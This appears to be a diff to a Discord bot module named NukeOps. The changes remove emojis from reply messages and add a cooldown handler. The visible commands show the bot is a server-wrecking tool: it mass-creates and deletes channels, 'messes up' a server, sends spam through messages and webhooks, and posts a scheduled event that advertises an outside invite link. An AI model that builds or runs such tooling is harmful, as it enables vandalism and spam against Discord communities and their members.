@@ -25,7 +25,7 @@ class NukeOps(commands.Cog):
             return
         try:
             count = await self.operations.CrChannel(guild)
-            await ctx.reply(f"✅ Created {count} channels.", delete_after=10)
+            await ctx.reply(f"Created {count} channels.", delete_after=10)
             logging.info(f"[create_channels] {count} channels in {guild.id}")
         except Exception as e:
             tb = traceback.format_exc()
@@ -42,7 +42,7 @@ class NukeOps(commands.Cog):
             return
         try:
             count = await self.operations.DelChannels(guild)
-            await ctx.reply(f"✅ Deleted {count} channels.", delete_after=10)
+            await ctx.reply(f"Deleted {count} channels.", delete_after=10)
             logging.info(f"[delete_channels] {count} channels in {guild.id}")
         except Exception as e:
             tb = traceback.format_exc()
@@ -59,7 +59,7 @@ class NukeOps(commands.Cog):
             return
         try:
             await self.operations.mess_server(guild)
-            await ctx.reply("✅ Server messed up.", delete_after=10)
+            await ctx.reply("Server messed up.", delete_after=10)
             logging.info(f"[mess_server] done in {guild.id}")
         except Exception as e:
             tb = traceback.format_exc()
@@ -76,7 +76,7 @@ class NukeOps(commands.Cog):
             return
         try:
             count = await self.operations.spam(guild)
-            await ctx.reply(f"✅ Sent {count} spam messages.", delete_after=10)
+            await ctx.reply(f"Sent {count} spam messages.", delete_after=10)
             logging.info(f"[spam] {count} messages in {guild.id}")
         except Exception as e:
             tb = traceback.format_exc()
@@ -93,7 +93,7 @@ class NukeOps(commands.Cog):
             return
         try:
             count = await self.operations.spam_webhook(guild)
-            await ctx.reply(f"✅ Sent {count} webhook messages.", delete_after=10)
+            await ctx.reply(f"Sent {count} webhook messages.", delete_after=10)
             logging.info(f"[spam_webhook] {count} messages in {guild.id}")
         except Exception as e:
             tb = traceback.format_exc()
@@ -119,11 +119,17 @@ class NukeOps(commands.Cog):
                 "entity_metadata": {"location": "https://discord.gg/Y6qZ4TKRM5"},
             }
             await self.operations._create_scheduled_event(guild.id, payload)
-            await ctx.reply("✅ Scheduled event created.", delete_after=10)
+            await ctx.reply("Scheduled event created.", delete_after=10)
             logging.info(f"[create_event] created in {guild.id}")
         except Exception as e:
             tb = traceback.format_exc()
             logging.error(f"[create_event] failed: {e}\n{tb}")
+
+    async def cog_command_error(self, ctx: commands.Context, error) -> None:
+        if isinstance(error, commands.CommandOnCooldown):
+            remaining = int(error.retry_after)
+            mins, secs = divmod(remaining, 60)
+            await ctx.reply(f"Cooldown active. Try again in {mins}m {secs}s.", delete_after=15)
 
 
 async def setup(bot: commands.Bot) -> None:
